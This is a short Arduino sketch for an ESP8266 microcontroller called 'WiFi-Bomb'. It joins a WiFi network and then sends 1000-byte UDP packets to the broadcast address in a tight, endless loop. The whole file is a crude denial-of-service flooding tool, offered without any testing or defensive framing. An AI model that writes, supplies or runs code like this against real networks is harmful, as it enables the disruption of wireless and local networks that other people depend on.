#include <WiFiManager.h>  
#include <ESP8266WiFi.h>
#include <WiFiUdp.h>

const char *ssid = "WiFi-Bomb";

uint8_t pkt[1000];

void setup() {
  Serial.begin(115200);
  setupWifi();
  memset(pkt, 0, sizeof(pkt));
}

void loop() {
  WiFiUDP udp;
  Serial.println("Send package");
  udp.beginPacketMulticast(WiFi.softAPIP(), 1, IPAddress(255,255,255,255), 1);
  udp.write(pkt, sizeof(pkt));
  udp.endPacket();
}

void setupWifi() {
    
    WiFiManager wifiManager;

    wifiManager.resetSettings();
    wifiManager.autoConnect(ssid);
    
    Serial.println("Local ip");
    Serial.println(WiFi.localIP());
}
